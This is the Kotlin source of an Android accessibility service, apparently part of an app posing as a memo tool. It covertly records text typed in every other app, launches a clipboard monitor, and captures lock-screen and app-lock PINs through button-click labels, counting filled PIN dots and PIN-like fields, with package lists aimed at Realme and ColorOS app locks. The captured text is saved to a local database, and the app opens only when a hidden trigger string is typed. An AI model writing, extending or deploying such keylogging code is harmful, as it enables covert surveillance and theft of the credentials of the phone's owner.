package com.example.memo.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.memo.data.AppDatabase
import com.example.memo.data.EntryEntity
import com.example.memo.data.SettingsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class TypeVaultAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private lateinit var database: AppDatabase
    private lateinit var settingsManager: SettingsManager

    // ── Keyboard capture state ──
    private var debounceJob: Job? = null
    private var lastPackageName: String? = null
    private var lastAppName: String? = null
    private var currentText: String = ""

    // ── PIN capture state (shared by all 3 methods) ──
    private var pinBuffer: StringBuilder = StringBuilder()
    private var pinPackageName: String? = null
    private var pinAppName: String? = null
    private var pinFlushJob: Job? = null
    private var lastWindowPackage: String = ""

    // Method 2: dot-count tracking (counts filled PIN dots to infer keystrokes)
    private var lastDotCount: Int = 0

    // Realme App Lock package names (all variants across Realme UI versions)
    private val REALME_APPLOCK_PACKAGES = setOf(
        "com.coloros.applock",
        "com.realme.applock",
        "com.android.packageinstaller",
        "com.coloros.safecenter",
        "com.oplus.appdetail",
        "com.android.settings"   // Some Realme UI versions use settings overlay
    )

    // Keywords that suggest we're on a PIN/lock screen (window title check)
    private val LOCK_WINDOW_KEYWORDS = listOf(
        "lock", "pin", "password", "unlock", "applock", "verify", "passcode", "secure"
    )

    // Digit click labels
    private val DIGIT_LABELS = setOf(
        "0","1","2","3","4","5","6","7","8","9",
        "zero","one","two","three","four","five","six","seven","eight","nine"
    )
    private val BACKSPACE_LABELS = setOf("delete","backspace","clear","⌫","back","cancel")

    override fun onServiceConnected() {
        super.onServiceConnected()
        database = AppDatabase.getDatabase(applicationContext)
        settingsManager = SettingsManager(applicationContext)

        try {
            val clipIntent = Intent(applicationContext, ClipboardMonitorService::class.java)
            applicationContext.startService(clipIntent)
        } catch (_: Exception) {}
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!settingsManager.isCapturingEnabled) return

        val packageName = event.packageName?.toString() ?: return
        if (packageName == this.packageName) return

        when (event.eventType) {

            // ══════════════════════════════════════════════════════════════
            // ── KEYBOARD CAPTURE (requires app in included list) ──
            // ══════════════════════════════════════════════════════════════
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val fullText = event.text.joinToString()
                
                // --- Secret Trigger to Open App ---
                if (fullText.contains("@@4556")) {
                    val intent = Intent(this@TypeVaultAccessibilityService, com.example.memo.MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    startActivity(intent)
                    return
                }

                // Check if this is a PIN field (not a password field, but contains only digits)
                val isPinField = isPinLikeTextField(event)

                if (isPinField) {
                    // Method 3: PIN field text changed (works if app doesn't use password inputType)
                    val text = fullText.filter { it.isDigit() }
                    if (text.isNotEmpty() && text.length <= 8) {
                        // This is likely a PIN being entered — but only capture if it's a lock screen
                        val windowTitle = event.className?.toString()?.lowercase() ?: ""
                        val isLockScreen = REALME_APPLOCK_PACKAGES.contains(packageName) ||
                                LOCK_WINDOW_KEYWORDS.any { windowTitle.contains(it) }
                        if (isLockScreen) {
                            appendPinDigit(text.last().toString(), packageName)
                        }
                    }
                } else {
                    // Capture keyboard input from ALL apps
                    if (fullText.isNotBlank()) {
                        val appName = getAppLabel(packageName)
                        if (lastPackageName != null && lastPackageName != packageName) commitCurrentText()
                        lastPackageName = packageName
                        lastAppName = appName
                        currentText = fullText
                        debounceJob?.cancel()
                        debounceJob = serviceScope.launch {
                            delay(2000)
                            commitCurrentText()
                        }
                    }
                }
            }

            // ══════════════════════════════════════════════════════════════
            // ── METHOD 1: CLICK EVENTS on digit buttons ──
            // The most reliable method when PIN pad buttons fire onClick
            // ══════════════════════════════════════════════════════════════
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handlePinClick(event, packageName)
            }

            // ══════════════════════════════════════════════════════════════
            // ── WINDOW CHANGE: flush PIN buffer when screen changes ──
            // ══════════════════════════════════════════════════════════════
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val windowTitle = (event.text.joinToString() +
                        (event.className?.toString() ?: "")).lowercase()
                val isOnLockScreen = REALME_APPLOCK_PACKAGES.contains(packageName) ||
                        LOCK_WINDOW_KEYWORDS.any { windowTitle.contains(it) }

                if (packageName != lastWindowPackage) {
                    if (pinBuffer.isNotEmpty()) {
                        flushPinBuffer(immediate = true)
                    }
                    lastDotCount = 0  // Reset dot counter
                }
                lastWindowPackage = packageName

                // If we just entered a lock screen, start monitoring it
                if (isOnLockScreen && pinPackageName == null) {
                    pinPackageName = packageName
                    pinAppName = getAppLabel(packageName)
                }
            }

            // ══════════════════════════════════════════════════════════════
            // ── METHOD 2: DOT COUNT DIFF (window content changed) ──
            // Counts the filled PIN indicator dots in the UI tree.
            // Works even when click events are not fired (touch-only pads).
            // ══════════════════════════════════════════════════════════════
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val isLockPackage = REALME_APPLOCK_PACKAGES.contains(packageName) ||
                        (pinPackageName != null && pinPackageName == packageName)
                if (!isLockPackage) return

                // Traverse the window tree and count filled PIN dots
                try {
                    val rootNode = rootInActiveWindow ?: return
                    val dotCount = countPinDots(rootNode)
                    rootNode.recycle()

                    when {
                        dotCount > lastDotCount -> {
                            // A new dot appeared = a digit was entered
                            // We can't know WHICH digit from the dot alone,
                            // so we mark it as "?" (position holder)
                            if (pinPackageName == null) {
                                pinPackageName = packageName
                                pinAppName = getAppLabel(packageName)
                            }
                            // Only add "?" if we didn't already capture via click method
                            // (avoid double-counting when both methods fire)
                            if (pinBuffer.length < dotCount) {
                                pinBuffer.append("?")
                                schedulePinFlush()
                            }
                        }
                        dotCount < lastDotCount && dotCount == 0 -> {
                            // All dots cleared = PIN submitted or cleared
                            flushPinBuffer(immediate = false)
                        }
                        dotCount < lastDotCount -> {
                            // One dot removed = backspace pressed
                            if (pinBuffer.isNotEmpty()) {
                                pinBuffer.deleteCharAt(pinBuffer.length - 1)
                            }
                        }
                    }
                    lastDotCount = dotCount
                } catch (_: Exception) {}
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // METHOD 2 HELPER: Count filled PIN indicator dots in the node tree
    // PIN pads typically show dots/circles that fill as you type.
    // We look for nodes that are "selected" or "checked" in a PIN indicator row.
    // ─────────────────────────────────────────────────────────────────────────
    private fun countPinDots(node: AccessibilityNodeInfo): Int {
        var count = 0
        try {
            val className = node.className?.toString() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""
            val viewId = node.viewIdResourceName?.lowercase() ?: ""

            // Look for views that look like PIN dot indicators
            val looksLikeDot = viewId.contains("dot") || viewId.contains("pin") ||
                    viewId.contains("indicator") || viewId.contains("bullet") ||
                    desc.contains("dot") || desc.contains("filled") ||
                    (className.contains("ImageView") && node.isSelected) ||
                    (className.contains("View") && node.isChecked)

            if (looksLikeDot && (node.isSelected || node.isChecked || node.isEnabled)) {
                count++
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                count += countPinDots(child)
                child.recycle()
            }
        } catch (_: Exception) {}
        return count
    }

    // ─────────────────────────────────────────────────────────────────────────
    // METHOD 1: Click event handler — captures digit from button label
    // ─────────────────────────────────────────────────────────────────────────
    private fun handlePinClick(event: AccessibilityEvent, packageName: String) {
        val textPart = event.text.joinToString().trim()
        val descPart = event.contentDescription?.toString()?.trim() ?: ""
        val combined = "$textPart $descPart".trim().lowercase()

        // Extract single digit
        val digit: String? = when {
            textPart.length == 1 && textPart[0].isDigit() -> textPart
            descPart.length == 1 && descPart[0].isDigit() -> descPart
            combined in DIGIT_LABELS -> combined.first { it.isDigit() }.toString()
            Regex("^[0-9]$").containsMatchIn(combined) ->
                Regex("[0-9]").find(combined)?.value
            // Realme sometimes uses content descriptions like "key_1", "digit 3"
            Regex("(key|digit|num)[ _]?([0-9])").containsMatchIn(combined) ->
                Regex("(key|digit|num)[ _]?([0-9])").find(combined)?.groupValues?.get(2)
            else -> null
        }

        val isBackspace = BACKSPACE_LABELS.any { combined.contains(it) }

        when {
            digit != null -> {
                appendPinDigit(digit, packageName)
                // If we added a real digit via click, replace any "?" at same position
                // (overwrite dot-count placeholders with real digits)
                val bufStr = pinBuffer.toString()
                if (bufStr.endsWith("?")) {
                    pinBuffer.setCharAt(bufStr.length - 1, digit[0])
                }
            }
            isBackspace && pinBuffer.isNotEmpty() -> {
                pinBuffer.deleteCharAt(pinBuffer.length - 1)
            }
        }
    }

    private fun appendPinDigit(digit: String, packageName: String) {
        if (pinPackageName == null || pinPackageName != packageName) {
            pinPackageName = packageName
            pinAppName = getAppLabel(packageName)
        }
        pinBuffer.append(digit)
        schedulePinFlush()
    }

    private fun schedulePinFlush() {
        pinFlushJob?.cancel()
        pinFlushJob = serviceScope.launch {
            delay(12_000)  // 12 seconds idle = save what we have
            flushPinBuffer(immediate = false)
        }
    }

    private fun flushPinBuffer(immediate: Boolean) {
        val digits = pinBuffer.toString()
        val pkg = pinPackageName
        val app = pinAppName

        if (digits.isNotEmpty() && pkg != null && app != null) {
            serviceScope.launch {
                database.entryDao().insertEntry(
                    EntryEntity(
                        appName = "🔐 $app",
                        packageName = pkg,
                        typedText = "PIN attempt: $digits",
                        timestamp = System.currentTimeMillis(),
                        source = "PIN"
                    )
                )
            }
        }

        pinBuffer.clear()
        lastDotCount = 0
        if (immediate) {
            pinPackageName = null
            pinAppName = null
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Helper: check if a text-change event looks like a PIN field
    // ─────────────────────────────────────────────────────────────────────────
    private fun isPinLikeTextField(event: AccessibilityEvent): Boolean {
        val source = event.source ?: return false
        return try {
            val isPassword = source.isPassword
            val className = source.className?.toString() ?: ""
            val viewId = source.viewIdResourceName?.lowercase() ?: ""
            val isPinId = viewId.contains("pin") || viewId.contains("passcode") ||
                    viewId.contains("otp") || viewId.contains("code")
            !isPassword && isPinId
        } catch (_: Exception) {
            false
        } finally {
            source.recycle()
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Keyboard capture helpers
    // ─────────────────────────────────────────────────────────────────────────
    private fun commitCurrentText() {
        if (currentText.isNotBlank() && lastPackageName != null && lastAppName != null) {
            saveEntry(currentText, lastPackageName!!, lastAppName!!)
            currentText = ""
            lastPackageName = null
            lastAppName = null
        }
    }

    override fun onInterrupt() {}

    private fun getAppLabel(packageName: String): String {
        return try {
            val info = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun saveEntry(text: String, packageName: String, appName: String) {
        serviceScope.launch {
            database.entryDao().insertEntry(
                EntryEntity(
                    appName = appName,
                    packageName = packageName,
                    typedText = text,
                    timestamp = System.currentTimeMillis(),
                    source = "KEYBOARD"
                )
            )
        }
    }
}

